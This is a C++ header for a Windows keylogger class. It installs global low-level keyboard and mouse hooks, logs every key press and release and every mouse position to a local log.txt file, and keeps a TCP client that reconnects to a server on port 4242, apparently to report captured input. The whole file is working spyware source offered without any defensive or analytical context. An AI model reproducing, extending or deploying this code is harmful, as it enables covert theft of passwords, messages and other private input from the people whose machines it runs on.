#ifndef _KEYLOGER_HPP_
#define _KEYLOGER_HPP_

#include <map>
#include <string>
#include <bitset>
#include <iostream>
#include <fstream>
#include <windowsx.h>
#include "Protocol.hpp"
#include "TCPClient.hpp"

///////////////////////////////////////////////////////////////////////////////////
//                       Callback WinAPI declaraction                            //
///////////////////////////////////////////////////////////////////////////////////

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK MouseProc(int code, WPARAM wParam, LPARAM lParam);

///////////////////////////////////////////////////////////////////////////////////
//                  Compact single instance class in stack                       //
///////////////////////////////////////////////////////////////////////////////////

class KeyLogger
{
private:
	TCPClient* m_client = nullptr;

public:
	virtual void onKeyboardEvent(int code, WPARAM wParam, LPARAM lParam) {
		KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
		std::string key;

		if (m_keycode2name.find(kbdStruct.vkCode) != m_keycode2name.end())
			key = m_keycode2name.at(kbdStruct.vkCode);
		else
			key = "unknown key";

		m_output << "Client " << key << (wParam == WM_KEYDOWN ? " pressed" : " released" ) << std::endl;
	};

	virtual void onMouseEvent(int code, WPARAM wParam, LPARAM lParam) {
		POINT pt = reinterpret_cast<MSLLHOOKSTRUCT*>(lParam)->pt;

		std::string mouse_button;
		if (m_mousecode2name.find(wParam) != m_mousecode2name.end()) {
			mouse_button = m_mousecode2name.at(wParam);
		}
		else {
			mouse_button = "move";
		}
		m_output << "Mouse " << mouse_button << " at: " << pt.x << " " << pt.y << std::endl;
	};

	void checkServer()
	{
		if (!m_client->isConnected()) {
			std::cout << "Trying to reconnect..." << std::endl;
			m_client->connectToHost("127.0.0.1", "4242");
		}
	}

	BOOL refreshNonBlocking() {
		PeekMessage(&m_msg, 0, NULL, 0, 0);
		//DispatchMessage(&m_msg);
		return TRUE;
	}

	BOOL refreshBlocking() {
		return GetMessage(&m_msg, 0, NULL, 0);
	}

	static KeyLogger& getInstance()
	{
		static KeyLogger singleton;
		return singleton;
	}

	void KeyLogger::setTCPClient(TCPClient *client)
	{
		m_client = client;
	}

	void KeyLogger::stopRecording()
	{
		UnhookWindowsHookEx(m_hook);
		UnhookWindowsHookEx(m_hook_mouse);
		m_output.close();
	}

	void KeyLogger::startRecording()
	{
		m_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0); //Enable keyboard hook
		m_hook_mouse = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, NULL, 0); //Enable mouse hook
		m_output.open("./log.txt", std::ofstream::app);
	}

	void KeyLogger::purgeLog()
	{
		m_output.open("./log.txt", std::ofstream::trunc);
		m_output.close();
	}

	HHOOK m_hook;
	HHOOK m_hook_mouse;
private:
	MSG m_msg;
	std::ofstream m_output;

	KeyLogger() {
		m_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0); //Enable keyboard hook
		m_hook_mouse = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, NULL, 0); //Enable mouse hook
		m_output.open("./log.txt", std::ofstream::app);
	};

	~KeyLogger() {
		UnhookWindowsHookEx(m_hook);
		UnhookWindowsHookEx(m_hook_mouse);
		m_output.close();
	};

	KeyLogger(const KeyLogger&);                 // SingleTon Cannot be copied copy-construction
	KeyLogger& operator=(const KeyLogger&) {      // SingleTon Cannot be assigned

	};
};

#endif /* !_KEYLOGER_HPP_ */